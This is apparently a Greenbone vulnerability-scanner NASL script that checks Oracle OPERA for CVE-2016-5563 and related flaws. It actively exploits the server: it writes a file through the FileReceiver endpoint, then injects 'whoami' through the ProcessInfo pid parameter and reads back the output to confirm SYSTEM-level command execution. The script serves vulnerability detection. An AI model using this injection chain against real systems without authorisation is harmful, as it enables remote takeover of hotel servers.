CPE = "cpe:/a:oracle:hospitality_opera_5_property_services";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.106483" );
	script_version( "2020-04-15T09:02:26+0000" );
	script_tag( name: "last_modification", value: "2020-04-15 09:02:26 +0000 (Wed, 15 Apr 2020)" );
	script_tag( name: "creation_date", value: "2016-12-20 08:18:50 +0700 (Tue, 20 Dec 2016)" );
	script_tag( name: "cvss_base", value: "6.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:S/C:P/I:P/A:P" );
	script_cve_id( "CVE-2016-5565", "CVE-2016-5564", "CVE-2016-5563" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "Oracle OPERA Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_oracle_opera_detect.sc" );
	script_mandatory_keys( "oracle/opera/installed" );
	script_tag( name: "summary", value: "Oracle OPERA is prone to multiple vulnerabilities." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP request and checks the response." );
	script_tag( name: "insight", value: "Oracle OPERA is prone to multiple vulnerabilities:

  - Remote command execution via OS command injection and remote file inclusion (CVE-2016-5563)

  - Exposure of Oracle SQL Database credentials (CVE-2016-5564)

  - Session hijacking via exposed logs (CVE-2016-5565)" );
	script_tag( name: "solution", value: "Update to the latest version of Oracle OPERA." );
	script_xref( name: "URL", value: "http://jackson.thuraisamy.me/oracle-opera.html" );
	script_xref( name: "URL", value: "http://www.oracle.com/technetwork/security-advisory/cpuoct2016-2881722.html" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
home_env = "D:\\micros/opera";
url = "/Operajserv/webarchive/ProcessInfo?pid=0";
req = http_get( port: port, item: url );
res = http_keepalive_send_recv( port: port, data: req );
if(ContainsString( res, "</STATUS><ERROR>java.lang.Exception" )){
	home = eregmatch( pattern: "File (.*)\\/operaias/default.env", string: res );
	if(isnull( home[1] )){
		exit( 0 );
	}
	home_env = home[1];
	length = strlen( home_env );
	env_url = "/Operajserv/webarchive/FileReceiver?filename=" + home_env + "\\operaias\\default.env&crc=" + length + "&append=false&trace=on";
	req = http_post_put_req( port: port, url: env_url, data: home_env, add_headers: make_array( "Content-Type", "application/x-www-form-urlencoded" ) );
	res = http_keepalive_send_recv( port: port, data: req );
	if(!ContainsString( res, "<FILERECEIVER><STATUS>OK</STATUS>" )){
		exit( 0 );
	}
}
vt_strings = get_vt_strings();
lower_name = vt_strings["lowercase"];
url = "/Operajserv/webarchive/ProcessInfo?pid=0%20%26%20whoami%20>%20" + home_env + "\\operaias\\webtemp\\" + lower_name + "_opera_test.txt%202";
req = http_get( port: port, item: url );
res = http_keepalive_send_recv( port: port, data: req );
res_url = "/webtemp/" + lower_name + "_opera_test.txt";
req = http_get( port: port, item: res_url );
res = http_keepalive_send_recv( port: port, data: req );
if(ContainsString( res, "nt authority\\system" )){
	report = http_report_vuln_url( port: port, url: res_url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 0 );

